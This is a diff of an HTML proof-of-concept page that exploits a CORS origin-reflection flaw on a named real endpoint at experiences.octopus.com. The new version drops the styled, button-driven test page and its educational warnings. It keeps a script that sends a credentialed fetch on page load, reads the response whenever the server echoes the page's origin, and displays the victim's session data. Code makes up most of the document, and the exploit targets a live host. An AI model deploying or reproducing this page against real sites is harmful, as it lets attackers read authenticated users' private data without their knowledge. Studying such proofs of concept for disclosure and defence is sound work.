@@ -1,343 +1,43 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<html>
+  <head>
     <title>CORS Vulnerability PoC</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+  </head>
+  <body>
+    <h1>CORS Vulnerability Proof of Concept</h1>
+    <p>This page demonstrates a CORS misconfiguration on the target domain. The server incorrectly reflects the 'Origin' header, allowing an attacker to read sensitive data from a victim's browser session.</p>
 
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            padding: 20px;
-            color: #333;
-        }
-
-        .container {
-            max-width: 1000px;
-            margin: 0 auto;
-            background: rgba(255, 255, 255, 0.95);
-            border-radius: 15px;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
-            overflow: hidden;
-        }
-
-        .header {
-            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
-            color: white;
-            padding: 30px;
-            text-align: center;
-        }
-
-        .header h1 {
-            font-size: 2.5em;
-            margin-bottom: 10px;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
-        }
-
-        .header p {
-            font-size: 1.1em;
-            opacity: 0.9;
-            line-height: 1.6;
-        }
-
-        .content {
-            padding: 40px;
-        }
-
-        .warning-box {
-            background: #fff3cd;
-            border: 2px solid #ffeaa7;
-            border-radius: 10px;
-            padding: 20px;
-            margin-bottom: 30px;
-            position: relative;
-        }
-
-        .warning-box::before {
-            content: "⚠️";
-            position: absolute;
-            top: -15px;
-            left: 20px;
-            background: #fff3cd;
-            padding: 5px 10px;
-            border-radius: 50%;
-            font-size: 1.5em;
-        }
-
-        .warning-box h3 {
-            color: #856404;
-            margin-bottom: 10px;
-            font-size: 1.3em;
-        }
-
-        .warning-box p {
-            color: #856404;
-            line-height: 1.6;
-        }
-
-        .test-section {
-            background: #f8f9fa;
-            border-radius: 10px;
-            padding: 25px;
-            margin-bottom: 30px;
-            border-left: 5px solid #007bff;
-        }
-
-        .test-section h3 {
-            color: #007bff;
-            margin-bottom: 15px;
-            font-size: 1.4em;
-        }
-
-        .url-display {
-            background: #2d3748;
-            color: #68d391;
-            padding: 15px;
-            border-radius: 8px;
-            font-family: 'Courier New', monospace;
-            font-size: 0.9em;
-            word-break: break-all;
-            margin: 15px 0;
-            border: 1px solid #4a5568;
-        }
-
-        .result-container {
-            margin-top: 30px;
-        }
-
-        .result-box {
-            background: #f8f9fa;
-            border-radius: 10px;
-            padding: 25px;
-            border: 2px solid #dee2e6;
-            min-height: 200px;
-        }
-
-        .success {
-            border-color: #28a745;
-            background: #d4edda;
-        }
-
-        .error {
-            border-color: #dc3545;
-            background: #f8d7da;
-        }
-
-        .success h2 {
-            color: #155724;
-            margin-bottom: 15px;
-        }
-
-        .error h2 {
-            color: #721c24;
-            margin-bottom: 15px;
-        }
-
-        .data-textarea {
-            width: 100%;
-            min-height: 300px;
-            padding: 15px;
-            border: 2px solid #ced4da;
-            border-radius: 8px;
-            font-family: 'Courier New', monospace;
-            font-size: 0.9em;
-            background: #ffffff;
-            resize: vertical;
-        }
-
-        .loading {
-            display: none;
-            text-align: center;
-            padding: 20px;
-        }
-
-        .spinner {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #007bff;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 15px;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .footer {
-            background: #343a40;
-            color: white;
-            text-align: center;
-            padding: 20px;
-            font-size: 0.9em;
-        }
-
-        .footer a {
-            color: #17a2b8;
-            text-decoration: none;
-        }
-
-        .footer a:hover {
-            text-decoration: underline;
-        }
-
-        @media (max-width: 768px) {
-            .container {
-                margin: 10px;
-                border-radius: 10px;
-            }
-            
-            .header h1 {
-                font-size: 2em;
-            }
-            
-            .content {
-                padding: 20px;
-            }
-            
-            .url-display {
-                font-size: 0.8em;
-            }
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="header">
-            <h1>🔒 CORS Vulnerability PoC</h1>
-            <p>Cross-Origin Resource Sharing (CORS) Misconfiguration Demonstration</p>
-        </div>
-
-        <div class="content">
-            <div class="warning-box">
-                <h3>Security Warning</h3>
-                <p>This page demonstrates a Cross-Origin Resource Sharing (CORS) misconfiguration vulnerability. The target server incorrectly reflects the 'Origin' header, potentially allowing an attacker to read sensitive data from a victim's browser session. This is for educational and security testing purposes only.</p>
-            </div>
-
-            <div class="test-section">
-                <h3>🎯 Target Endpoint</h3>
-                <div class="url-display" id="targetUrl">
-                    https://experiences.octopus.com/edit/user/S5MXxSUXSwK14Z8keWBBd6Fq3w6UFIsisQh74967mTyL9P-1RWXG9-F6slQQ10ZwKLtXEa/elements.js
-                </div>
-                <p><strong>Attack Vector:</strong> The server reflects the Origin header in Access-Control-Allow-Origin, allowing cross-origin requests with credentials.</p>
-            </div>
-
-            <div class="loading" id="loading">
-                <div class="spinner"></div>
-                <p>Testing CORS vulnerability...</p>
-            </div>
-
-            <div class="result-container">
-                <div class="result-box" id="result">
-                    <h3>Test Results</h3>
-                    <p>Click the button below to test the CORS vulnerability.</p>
-                    <button onclick="testCORSVulnerability()" style="background: #007bff; color: white; border: none; padding: 12px 24px; border-radius: 6px; cursor: pointer; font-size: 1em; margin-top: 15px;">
-                        🚀 Test CORS Vulnerability
-                    </button>
-                </div>
-            </div>
-        </div>
-
-        <div class="footer">
-            <p>⚠️ <strong>Educational Purpose Only</strong> - This tool is designed for security researchers and developers to understand CORS vulnerabilities.</p>
-            <p>For responsible disclosure and security testing only.</p>
-        </div>
-    </div>
+    <div id="result"></div>
 
     <script>
-        // The vulnerable endpoint URL
-        const VULNERABLE_URL = 'https://experiences.octopus.com/edit/user/S5MXxSUXSwK14Z8keWBBd6Fq3w6UFIsisQh74967mTyL9P-1RWXG9-F6slQQ10ZwKLtXEa/elements.js';
+      const VULNERABLE_URL = 'https://experiences.octopus.com/edit/user/S5MXxSUXSwK14Z8keWBBd6Fq3w6UFIsisQh74967mTyL9P-1RWXG9-F6slQQ10ZwKLtXEa/elements.js';
 
-        // The malicious origin URL (this page's origin)
-        const MALICIOUS_ORIGIN = window.location.origin;
-
-        function testCORSVulnerability() {
-            const resultDiv = document.getElementById('result');
-            const loadingDiv = document.getElementById('loading');
-            
-            // Show loading state
-            loadingDiv.style.display = 'block';
-            resultDiv.innerHTML = '';
-
-            // Make a cross-origin request to the vulnerable endpoint
-            fetch(VULNERABLE_URL, {
-                method: 'GET',
-                // 'credentials: "include"' is crucial for sending cookies
-                credentials: 'include'
-            })
-            .then(response => {
-                // Log the response headers to show the reflection
-                console.log('Server Response Headers:', response.headers);
-
-                // Check for the vulnerable header
-                const allowOriginHeader = response.headers.get('Access-Control-Allow-Origin');
-                console.log('Access-Control-Allow-Origin:', allowOriginHeader);
-                console.log('Malicious Origin:', MALICIOUS_ORIGIN);
-
-                if (allowOriginHeader === MALICIOUS_ORIGIN) {
-                    // If the origin is reflected, read the response body
-                    // This is the major security flaw
-                    return response.text();
-                } else {
-                    // The vulnerability is not present or was fixed
-                    console.log('Vulnerability not confirmed. Origin header was not reflected.');
-                    throw new Error('CORS vulnerability not found - Origin header was not reflected');
-                }
-            })
-            .then(data => {
-                // Hide loading and display success
-                loadingDiv.style.display = 'none';
-                
-                // Display the sensitive data that was successfully read
-                resultDiv.className = 'result-box success';
-                resultDiv.innerHTML = `
-                    <h2>🚨 Vulnerability Confirmed!</h2>
-                    <p><strong>Sensitive data was successfully read from the victim's session.</strong></p>
-                    <p>The server incorrectly reflected the Origin header, allowing cross-origin access to protected resources.</p>
-                    <h4>📋 Retrieved Data:</h4>
-                    <textarea class="data-textarea" readonly>${data}</textarea>
-                    <p style="margin-top: 15px; font-size: 0.9em; color: #155724;">
-                        <strong>Impact:</strong> An attacker could use this vulnerability to steal sensitive user data, session tokens, or other protected information from authenticated users.
-                    </p>
-                `;
-                console.log('Successfully read sensitive data:', data);
-            })
-            .catch(error => {
-                // Hide loading and display error
-                loadingDiv.style.display = 'none';
-                
-                // Handle any errors
-                console.error('Error:', error);
-                resultDiv.className = 'result-box error';
-                resultDiv.innerHTML = `
-                    <h2>❌ Test Failed</h2>
-                    <p><strong>Error:</strong> ${error.message}</p>
-                    <p>This could mean:</p>
-                    <ul style="margin-left: 20px; margin-top: 10px;">
-                        <li>The vulnerability has been patched</li>
-                        <li>The server is not responding</li>
-                        <li>CORS policies are properly configured</li>
-                        <li>Network connectivity issues</li>
-                    </ul>
-                    <button onclick="testCORSVulnerability()" style="background: #dc3545; color: white; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; font-size: 0.9em; margin-top: 15px;">
-                        🔄 Retry Test
-                    </button>
-                `;
-            });
+      fetch(VULNERABLE_URL, {
+        method: 'GET',
+        // 'credentials: "include"' is crucial for sending cookies
+        credentials: 'include'
+      })
+      .then(response => {
+        const allowOriginHeader = response.headers.get('Access-Control-Allow-Origin');
+        // The server reflects the browser's Origin header.
+        if (allowOriginHeader === window.location.origin) {
+          console.log('Vulnerability Confirmed. The server reflected the origin:', allowOriginHeader);
+          return response.text();
+        } else {
+          console.log('CORS vulnerability not found. The server did not reflect the origin.');
+          throw new Error('CORS vulnerability not found');
         }
-
-        // Auto-run the test when page loads (optional)
-        // Uncomment the line below if you want the test to run automatically
-        // window.addEventListener('load', testCORSVulnerability);
+      })
+      .then(data => {
+        document.getElementById('result').innerHTML = '<h2>Vulnerability Confirmed!</h2>' +
+                                                     '<p>Sensitive data was successfully read from the victim\'s session.</p>' +
+                                                     '<textarea rows="15" cols="80">' + data + '</textarea>';
+        console.log('Successfully read sensitive data:', data);
+      })
+      .catch(error => {
+        console.error('Error:', error);
+        document.getElementById('result').innerHTML = '<p style="color:red;">Error: ' + error.message + '</p>';
+      });
     </script>
-</body>
+  </body>
 </html>
